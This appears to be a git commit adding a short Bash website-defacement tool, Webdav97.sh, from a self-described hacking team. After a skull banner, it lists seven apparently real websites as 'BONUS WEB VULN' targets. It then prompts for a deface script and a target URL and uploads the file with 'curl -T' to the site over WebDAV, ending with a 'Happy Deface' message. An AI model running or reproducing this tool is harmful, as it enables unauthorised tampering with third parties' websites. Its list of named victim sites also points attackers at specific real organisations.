b902df691b6c4f544fb30f24614b58807e11c52d
Squad DarkCyber Team <72856961+M7909@users.noreply.github.com>
2020-10-30 22:41:13 +0800

    Add files via upload

---
+++ Webdav97.sh
@@ -0,0 +1,95 @@
+#usr/bin/bash
+clear
+#ini warna
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih                                                                                                                       ku='\033[33;1m' #kuning
+# Recode ajh mmnx
+echo                                                                                                                                         echo
+#ini paket untuk menjalankan tools
+Deface.sh
+echo
+clear
+echo
+echo $me"                     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶"
+echo $me"                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶"
+echo $me"              ¶¶¶¶                        ¶¶¶¶"
+echo $me"             ¶¶¶                            ¶¶¶"
+echo $me"            ¶¶                                ¶¶"
+echo $me"           ¶¶                                  ¶¶"
+echo $me"          ¶¶                                   ¶¶"
+echo $me"          ¶¶´¶¶                             ¶¶´¶¶"
+echo $me"          ¶¶´¶¶                             ¶¶´´¶"
+echo $me"          ¶¶´¶¶                             ¶¶´´¶"
+echo $me"         ¶¶  ¶¶                            ¶¶´¶¶"
+echo $me"          ¶¶´´¶¶                           ¶¶´´¶¶"
+echo $me"           ¶¶´¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶´¶¶"
+echo $me"            ¶¶¶¶´¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶"
+echo $me"             ¶¶¶´¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶"
+echo $me"    ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶"
+echo $me"   ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶"
+echo $me"  ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶"
+echo $me" ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶"
+echo $me"¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶        ¶¶¶¶¶¶¶¶¶        ¶¶"
+echo $me"¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶"
+echo $me"  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶"
+echo $me"       ¶¶¶¶¶¶  ¶¶¶  ¶¶           ¶¶  ¶¶¶  ¶¶¶¶¶¶"
+echo $me"              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶"
+echo $me"                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶"
+echo $me"                ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶"
+echo $me"    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶"
+echo $me"   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶"
+echo $me"      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶"
+echo $me"      ¶¶  ¶¶                                   ¶¶  ¶¶"
+echo $me"       ¶¶¶¶                                     ¶¶¶¶"
+echo
+echo
+echo "\033[1;33m +--------------------------------------------+"
+echo "\033[1;33m + Author :Mr.Santuy                          +"
+echo "\033[1;33m +Tim    :Squad DarkCyber Team                +"
+echo "\033[1;33m +Note   :Saya Jago Karna Saya Berusaha       +"
+echo "\033[1;33m +-------------------------------------------+"
+echo
+echo "\033[1;30mBONUS WEB VULN"
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://totemafrica.com"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://uzingela.co.za"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://thefoundation.co.za"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://techdirect.co.za"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://tieronecapital.co.za"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://ziady.com"
+echo "\033[1;30m-----------------------------------------------"
+echo
+echo "\033[1;30m-----------------------------------------------"
+echo "[URL] http://whadiz.com"
+echo "\033[1;30m-----------------------------------------------"
+echo
+read -p "Masukan Nama Script Deface Kalian >> " sc
+read -p "Web Target >> " web
+curl -T /sdcard/$sc $web
+
+echo
+
+echo "Silakan Di cek ==> "$web/$sc
+
+
+figlet Happy Deface | lolcat
+
